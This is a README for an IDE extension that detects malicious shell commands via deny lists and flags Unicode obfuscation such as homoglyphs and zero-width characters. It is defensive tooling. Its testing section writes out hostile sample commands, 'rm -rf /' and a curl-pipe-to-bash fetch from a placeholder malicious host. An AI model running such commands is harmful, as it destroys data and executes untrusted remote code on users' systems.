# MalCode Detector for VSCode-Cursor-Windsurf IDE

This IDE extension helps detect potentially malicious commands and Unicode obfuscation techniques in your code. It's designed to be used with VS Code and compatible editors.

## Features

-   **Real-time Scanning**: Automatically scans files upon opening and saving.
-   **Deny List Matching**: Detects known malicious commands using configurable deny lists.
-   **Unicode Obfuscation Detection**: Identifies various Unicode-based obfuscation techniques:
    -   **Homoglyphs**: Flags characters that look like other characters (e.g., Cyrillic 'а' for Latin 'a').
    -   **Invisible Characters**: Detects zero-width spaces and other non-printing characters.
    -   **Bidirectional Control Characters**: Warns about characters that can alter text rendering order.
    -   **Mixed Scripts**: Highlights lines with characters from multiple scripts (e.g., Latin and Cyrillic).
-   **Configurable**: Customize deny list paths and toggle real-time scanning through VS Code settings.

## Usage

Once installed, the "Cursor Deny List Malcode Detector" works in the background:

-   **Automatic Analysis**: Files are automatically scanned when opened or saved. If potential issues are found, VS Code will display diagnostic warnings (e.g., squiggly underlines) on the problematic lines. Hover over the underlined code to see a description of the issue.
-   **Manual Scan**: You can also manually trigger a scan for the currently active file by opening the Command Palette (`Ctrl+Shift+P` or `Cmd+Shift+P` on macOS) and running the command "Scan Current File for Malicious Patterns".
-   **Ignore File**: You can right-click a file in the VS Code Explorer and select "Ignore This File (MalCode Detector)" from the context menu. This will add the file to an ignore list, and it will no longer be scanned by the extension.
-   **Problems Panel**: Detected issues are listed in the "Problems" panel in VS Code (View > Problems).

## Configuration

You can configure the extension via VS Code settings (File > Preferences > Settings, then search for "MalCode Detector for VSCode-Cursor-Windsurf IDE"):

-   **`malcode-detector-vscode-cursor-windsurf-ide.enableRealtimeScan`**: 
    -   **Description**: Enable real-time scanning of files on open and save.
    -   **Type**: `boolean`
    -   **Default**: `true`

-   **`malcode-detector-vscode-cursor-windsurf-ide.denyListPaths`**: 
    -   **Description**: Paths to the deny list JSON files, relative to the extension's root directory. You can customize these paths if you have your own deny lists or a different directory structure.
    -   **Type**: `object`
    -   **Default**:
        ```json
        {
          "windows": "deny_lists/windows_deny_list.json",
          "macos": "deny_lists/macos_deny_list.json",
          "linux": "deny_lists/linux_deny_list.json",
          "universal": "deny_lists/universal_deny_list.json"
        }
        ```

-   **`malcode-detector-vscode-cursor-windsurf-ide.ignoredFiles`**:
    -   **Description**: A list of file paths (relative to the workspace root) to be ignored by the MalCode Detector. Files in this list will not be scanned. You can manually edit this list or use the "Ignore This File (MalCode Detector)" command from the explorer context menu.
    -   **Type**: `array`
    -   **Default**: `[]`

## Troubleshooting

-   **No diagnostics shown**: 
    -   Ensure the extension is enabled in the Extensions view.
    -   Check the VS Code "Output" panel (select "Cursor Deny List Malcode Detector" from the dropdown) for any error messages.
    -   Verify that the file type you are editing is included in the `activationEvents` in `package.json` (if you are developing the extension).
    -   Make sure your deny list paths in the settings are correct and the JSON files are valid.
-   **Performance issues**: If you experience slowdowns, especially with very large files, you can disable `cursord-malcode-detector.enableRealtimeScan` in the settings and use the "Scan Current File for Malicious Patterns" command manually.

## Release Notes

See [CHANGELOG.md](CHANGELOG.md) for detailed release notes.

## Prerequisites

-   [Node.js](https://nodejs.org/) (which includes npm)
-   [Visual Studio Code](https://code.visualstudio.com/)

## Installation and Setup (for Development)

1.  **Clone the Repository**:
    If you haven't already, clone the main project repository that contains this `ide_extension` folder.

2.  **Navigate to the Extension Directory**:
    Open your terminal and navigate to this directory:
    ```bash
    cd path/to/your/Cursur_deny_list/ide_extension
    ```

3.  **Install Dependencies**:
    Run npm to install the necessary dependencies defined in `package.json`:
    ```bash
    npm install
    ```

4.  **Compile TypeScript**:
    The extension is written in TypeScript. Compile it to JavaScript using:
    ```bash
    npm run compile
    ```
    This will typically create an `out` directory containing the compiled JavaScript files.

## Running and Testing in VS Code

1.  **Open the Extension Folder in VS Code**:
    Open the `ide_extension` folder itself as the root workspace in VS Code.

2.  **Launch the Extension Development Host**:
    -   Press `F5` (or go to "Run" > "Start Debugging").
    -   This will open a new VS Code window (the "Extension Development Host") with this extension loaded.

3.  **Verify Installation**:
    -   In the Extension Development Host window, open any text file (e.g., a shell script, a source code file, or a plain text file).
    -   The extension activates on opening or changing text documents.

4.  **Testing Functionality**:

    *   **Deny List Pattern Matching**:
        -   The extension loads deny list patterns from the `../../deny_lists/` directory (relative to the compiled extension code, typically `ide_extension/out/`). These lists contain patterns for known malicious commands.
        -   Try typing or pasting commands that are known to be malicious and should be on the deny lists (e.g., `rm -rf /`, `curl malicious.com/script.sh | bash`).
        -   You should see warnings or diagnostics displayed by VS Code for the lines containing these patterns. The specific appearance depends on how diagnostics are rendered.

    *   **Unicode Obfuscation Detection**:
        -   The extension scans for several types of Unicode obfuscation:
            -   **Homoglyphs**: Characters that look like other characters (e.g., a Cyrillic 'а' instead of a Latin 'a').
                -   Example: `echo "hellо"` (where 'о' is Cyrillic)
            -   **Invisible Characters**: Zero-width spaces or other non-printing characters that can break up commands or hide code.
                -   Example: `e\u200Bcho "hidden"` (contains a Zero Width Space)
            -   **Bidirectional Control Characters**: Characters that can alter the visual rendering order of text.
            -   **Mixed Scripts**: Lines containing characters from multiple scripts (e.g., Latin and Cyrillic) which can be an obfuscation technique.
        -   Try typing text containing these Unicode patterns.
        -   The extension should flag these issues, providing descriptions in the diagnostics.

    *   **Test Cases**:
        -   Refer to the `../../test_cases/` and `../../test_payloads/` directories in the main project for examples of malicious patterns and Unicode obfuscation techniques to test with.
        -   Copy and paste content from these files into the editor in the Extension Development Host window.

## Extension Structure (Simplified)

-   `src/extension.ts`: The main activation point for the VS Code extension.
-   `src/fileAnalyzerService.ts`: Contains the core logic for analyzing document content against deny lists and Unicode rules.
-   `src/denyListService.ts`: Handles loading, parsing, and querying the deny list patterns.
-   `src/unicodeScanner.ts`: Provides functions to detect various Unicode-based obfuscation techniques.
-   `out/`: Directory where the compiled JavaScript code is placed (after `npm run compile`). This is what VS Code runs.
-   `package.json`: Defines extension metadata, dependencies, and build scripts.

## Contributing

-   **Deny Lists**: To add or modify deny list patterns, edit the JSON files in the `Cursur_deny_list/deny_lists/` directory. Follow the existing structure and refer to `PRD.md` for guidelines.
-   **Code**: For code contributions, open the `ide_extension` folder in VS Code, make your changes, and ensure `npm run compile` runs without errors. Test thoroughly using the Extension Development Host. 
